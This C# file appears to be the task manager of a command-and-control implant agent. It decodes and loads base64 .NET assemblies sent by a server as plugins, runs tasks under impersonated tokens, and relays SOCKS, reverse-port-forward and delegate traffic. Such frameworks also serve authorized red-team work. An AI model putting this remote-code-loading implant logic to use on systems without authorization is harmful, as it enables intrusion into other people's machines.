using Agent.Interfaces;
using Agent.Models;
using Agent.Utilities;
using System.Security.Principal;
using System.Text.Json;
using System.Text.Json.Serialization;

namespace Agent.Managers
{
    public class TaskManager : ITaskManager
    {
        private ILogger logger { get; set; }
        public IAssemblyManager assemblyManager { get; set; }
        private IMessageManager messageManager { get; set; }
        private ITokenManager tokenManager { get; set; }
        private readonly TimeSpan proxyDatagramTimeout;
        private readonly SemaphoreSlim proxyHandlerSlots = new(16, 16);
        public TaskManager(ILogger logger, IAssemblyManager assemblyManager, IMessageManager messageManager, ITokenManager tokenManager)
            : this(logger, assemblyManager, messageManager, tokenManager, TimeSpan.FromSeconds(30))
        {
        }

        public TaskManager(ILogger logger, IAssemblyManager assemblyManager, IMessageManager messageManager, ITokenManager tokenManager, TimeSpan proxyDatagramTimeout)
        {
            this.logger = logger;
            this.assemblyManager = assemblyManager;
            this.messageManager = messageManager;
            this.tokenManager = tokenManager;
            this.proxyDatagramTimeout = proxyDatagramTimeout;
        }

        public async Task StartTaskAsync(ServerJob job)
        {
            this.messageManager.AddJob(job);
            TaskResponse rr = new TaskResponse()
            {
                task_id = job.task.id,
                status = "completed",
                user_output = ""
            };
            switch (job.task.command)
            {
                case "load":
                    LoadCommand? loadCommand;
                    try
                    {
                        loadCommand = JsonSerializer.Deserialize(job.task.parameters, LoadCommandJsonContext.Default.LoadCommand);
                    }
                    catch (Exception e) when (e is JsonException or FormatException or ArgumentNullException)
                    {
                        FailMalformedLoad(job, e.Message);
                        break;
                    }

                    if (loadCommand is null)
                    {
                        FailMalformedLoad(job, "Load parameters cannot be null.");
                        break;
                    }

                    if (string.IsNullOrWhiteSpace(loadCommand.command) || string.IsNullOrWhiteSpace(loadCommand.asm))
                    {
                        FailMalformedLoad(job, "Plugin command and assembly payload are required.");
                        break;
                    }

                    byte[] loadBuffer;
                    try
                    {
                        loadBuffer = Misc.Base64DecodeToByteArray(loadCommand.asm);
                    }
                    catch (FormatException e)
                    {
                        FailMalformedLoad(job, e.Message);
                        break;
                    }
                    if (loadBuffer.Length == 0)
                    {
                        FailMalformedLoad(job, "Assembly payload cannot be empty.");
                        break;
                    }

                    if (this.assemblyManager.LoadPluginAsync(job.task.id, loadCommand.command, loadBuffer))
                    {
                        LoadTaskResponse cr = new LoadTaskResponse()
                        {
                            completed = true,
                            user_output = $"Loaded plugin {loadCommand.command}",
                            task_id = job.task.id,
                            commands = new List<CommandsResponse>()
                            {
                                new CommandsResponse()
                                {
                                    action = "add",
                                    cmd = loadCommand.command,
                                }
                            }
                        };
                        this.messageManager.AddTaskResponse(cr.ToJson(), job.task.id, cr.completed);
                    }
                    else
                    {
                        LoadTaskResponse cr = new LoadTaskResponse()
                        {
                            completed = true,
                            user_output = $"Failed to load plugin {loadCommand.command}",
                            task_id = job.task.id,
                            commands = new List<CommandsResponse>()
                        };
                        this.messageManager.AddTaskResponse(cr.ToJson(), job.task.id, cr.completed);
                    }
                    break;
                case "load-assembly":
                    LoadCommand? command;
                    try
                    {
                        command = JsonSerializer.Deserialize(job.task.parameters, LoadCommandJsonContext.Default.LoadCommand);
                    }
                    catch (Exception e) when (e is JsonException or FormatException or ArgumentNullException)
                    {
                        FailMalformedLoad(job, e.Message);
                        break;
                    }

                    if (command is null)
                    {
                        FailMalformedLoad(job, "Load parameters cannot be null.");
                        break;
                    }

                    if (string.IsNullOrWhiteSpace(command.asm))
                    {
                        FailMalformedLoad(job, "Assembly payload is required.");
                        break;
                    }

                    byte[] assemblyBuffer;
                    try
                    {
                        assemblyBuffer = Misc.Base64DecodeToByteArray(command.asm);
                    }
                    catch (FormatException e)
                    {
                        FailMalformedLoad(job, e.Message);
                        break;
                    }
                    if (assemblyBuffer.Length == 0)
                    {
                        FailMalformedLoad(job, "Assembly payload cannot be empty.");
                        break;
                    }

                    this.assemblyManager.LoadAssemblyAsync(job.task.id, assemblyBuffer);
                    break;
                default:
                    _ = Task.Run(async () =>
                    {
                        if (!this.assemblyManager.TryGetPlugin(job.task.command, out IPlugin plug))
                        {
                            this.messageManager.AddTaskResponse(new TaskResponse()
                            {
                                task_id = job.task.id,
                                user_output = "Plugin not found. Please load it.",
                                status = "error",
                                completed = true,
                            });
                            return;
                        }

                        if(job.task.token == 0)
                        {
                            try
                            {
                                await plug.Execute(job);
                            }
                            catch (Exception e)
                            {
                                this.messageManager.AddTaskResponse(new TaskResponse()
                                {
                                    task_id = job.task.id,
                                    user_output = e.ToString(),
                                    status = "error",
                                    completed = true,
                                });
                            }
                            return;
                        }

                        try
                        {
                            tokenManager.RunTaskImpersonated(plug, job);
                        }
                        catch (Exception e)
                        {
                            this.messageManager.AddTaskResponse(new TaskResponse()
                            {
                                task_id = job.task.id,
                                user_output = e.ToString(),
                                status = "error",
                                completed = true,
                            });
                        }
                        return;
                    });
                            
                    break;
            }
        }

        private void FailMalformedLoad(ServerJob job, string error)
        {
            this.messageManager.AddTaskResponse(new TaskResponse
            {
                task_id = job.task.id,
                user_output = error,
                status = "error",
                completed = true,
            });
            this.messageManager.CompleteJob(job.task.id);
        }

        public async Task HandleServerResponses(List<ServerTaskingResponse> responses)
        {
            List<Task> tasks = new List<Task>();
            foreach(var response in responses)
            {
                if (response is null)
                {
                    continue;
                }

                ServerJob job;

                if (!this.messageManager.TryGetJob(response.task_id, out job) || !this.assemblyManager.TryGetPlugin<IFilePlugin>(job.task.command, out var plugin))
                {
                    continue;
                }

                if(plugin is null)
                {
                    continue;
                }

                if (job.task.token > 0)
                {
                    tasks.Add(HandleFileResponse(
                        () => tokenManager.HandleFilePluginImpersonated(plugin, job, response),
                        response.task_id));
                    continue;
                }

                tasks.Add(HandleFileResponse(() => plugin.HandleNextMessage(response), response.task_id));
            }

            await Task.WhenAll(tasks);
        }

        private async Task HandleFileResponse(Func<Task> dispatch, string taskId)
        {
            try
            {
                await dispatch().ConfigureAwait(false);
            }
            catch (Exception e)
            {
                messageManager.WriteLine(e.ToString(), taskId, true, "error");
            }
        }
        public async Task HandleProxyResponses(string type, List<ServerDatagram> responses)
        {
            if (!this.assemblyManager.TryGetPlugin<IProxyPlugin>(type, out var plugin))
            {
                return;
            }

            if (plugin is null || responses is null)
            {
                return;
            }

            if (type.Equals("socks", StringComparison.OrdinalIgnoreCase) ||
                type.Equals("rpfwd", StringComparison.OrdinalIgnoreCase))
            {
                this.logger?.Debug($"Handling {responses.Count} {type} datagram(s)");
            }
            else
            {
                this.logger?.Debug($"Handling proxy datagram batch for plugin '{type}' ({responses.Count} item(s))");
            }

            await Parallel.ForEachAsync(
                responses,
                new ParallelOptions { MaxDegreeOfParallelism = 16 },
                async (response, _) => await HandleProxyDatagram(plugin, response, proxyDatagramTimeout).ConfigureAwait(false))
                .ConfigureAwait(false);
        }

        private async Task HandleProxyDatagram(IProxyPlugin plugin, ServerDatagram response, TimeSpan timeout)
        {
            if (!await proxyHandlerSlots.WaitAsync(timeout).ConfigureAwait(false))
                return;

            Task handling;
            try
            {
                handling = plugin.HandleDatagram(response);
            }
            catch
            {
                proxyHandlerSlots.Release();
                // Proxy frames are independent. A malformed frame must not fail the batch.
                return;
            }

            Task completed = await Task.WhenAny(handling, Task.Delay(timeout)).ConfigureAwait(false);
            if (completed != handling)
            {
                _ = ReleaseProxySlotWhenComplete(handling);
                return;
            }

            try
            {
                await handling.ConfigureAwait(false);
            }
            catch
            {
                // Proxy frames are independent. A malformed frame must not fail the batch.
            }
            finally
            {
                proxyHandlerSlots.Release();
            }
        }

        private async Task ReleaseProxySlotWhenComplete(Task handling)
        {
            try
            {
                await handling.ConfigureAwait(false);
            }
            catch
            {
            }
            finally
            {
                proxyHandlerSlots.Release();
            }
        }
        public async Task HandleDelegateResponses(List<DelegateMessage> responses)
        {
            List<Task> tasks = new List<Task>();
            foreach(var response in responses)
            {
                if (response is null)
                {
                    continue;
                }

                if (!this.assemblyManager.TryGetPlugin<IForwarderPlugin>(response.c2_profile, out var plugin))
                {
                    continue;
                }

                if (plugin is null)
                {
                    continue;
                }

                try
                {
                    tasks.Add(plugin.ForwardDelegate(response));
                }
                catch { }
            }
            await Task.WhenAll(tasks);
        }
        public async Task HandleInteractiveResponses(List<InteractMessage> responses)
        {
            List<Task> tasks = new List<Task>();
            foreach(var response in responses)
            {
                if (response is null)
                {
                    continue;
                }

                ServerJob job;

                if (!this.messageManager.TryGetJob(response.task_id, out job) || !this.assemblyManager.TryGetPlugin<IInteractivePlugin>(job.task.command, out var plugin))
                {
                    continue;
                }

                if (job.task.token > 0)
                {
                    tasks.Add(Task.Run(() => tokenManager.HandleInteractivePluginImpersonated(plugin, job, response)));
                    continue;
                }

                try
                {
                    tasks.Add(Task.Run(() => plugin.Interact(response)));
                }
                catch { }
            }

            //I might not need this
            await Task.WhenAll(tasks);
        }
    }
}
